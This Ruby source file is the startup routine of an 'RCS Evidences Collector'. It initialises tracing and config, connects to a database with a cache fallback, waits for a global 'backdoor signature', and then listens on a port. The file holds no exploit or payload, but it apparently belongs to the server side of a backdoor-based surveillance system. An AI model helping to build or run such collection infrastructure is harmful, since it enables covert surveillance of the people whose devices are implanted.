#
#  The main file of the collector
#

# relatives
require_relative 'events.rb'
require_relative 'config.rb'
require_relative 'db.rb'

# from RCS::Common
require 'rcs-common/trace'

# from System
require 'yaml'

module RCS
module Collector

class Application
  include RCS::Tracer

  # the main of the collector
  def run(options)

    # if we can't find the trace config file, default to the system one
    if File.exist? 'trace.yaml' then
      typ = Dir.pwd
      ty = 'trace.yaml'
    else
      typ = File.dirname(File.dirname(File.dirname(__FILE__)))
      ty = typ + "/config/trace.yaml"
      puts "Cannot find 'trace.yaml' using the default one (#{ty})"
    end

    # initialize the tracing facility
    begin
      trace_init typ, ty
    rescue Exception => e
      puts e
      exit
    end

    begin

      trace :info, "Starting the RCS Evidences Collector..."
      
      # config file parsing
      return 1 unless Config.instance.load_from_file

      # ensure the public directory is present
      Dir::mkdir(Dir.pwd + '/public') if not File.directory?(Dir.pwd + '/public')

      begin
        # test the connection to the database
        if DB.instance.connect! then
          trace :info, "Database connection succeeded"
        else
          trace :warn, "Database connection failed, using local cache..."
        end

        # cache initialization
        DB.instance.cache_init

        # wait 10 seconds and retry the connection
        # this case should happen only the first time we connect to the db
        # after the first successful connection, the cache will get populated
        # and even if the db is down we can continue
        if DB.instance.backdoor_signature.nil? then
          trace :info, "Empty global signature, cannot continue. Waiting 10 seconds and retry..."
          sleep 10
        end

      # do not continue if we don't have the global backdoor signature
      end while DB.instance.backdoor_signature.nil?

      # enter the main loop (hopefully will never exit from it)
      Events.new.setup Config.instance.global['LISTENING_PORT']

    rescue Exception => detail
      trace :fatal, "FAILURE: " << detail.message
      trace :fatal, "EXCEPTION: " << detail.backtrace.join("\n")
      return 1
    end

    return 0
  end

  # we instantiate here an object and run it
  def self.run!(*argv)
    return Application.new.run(argv)
  end

end # Application::
end # Collector::
end # RCS::


if __FILE__ == $0
  RCS::Collector::Application.run!(*ARGV)
end
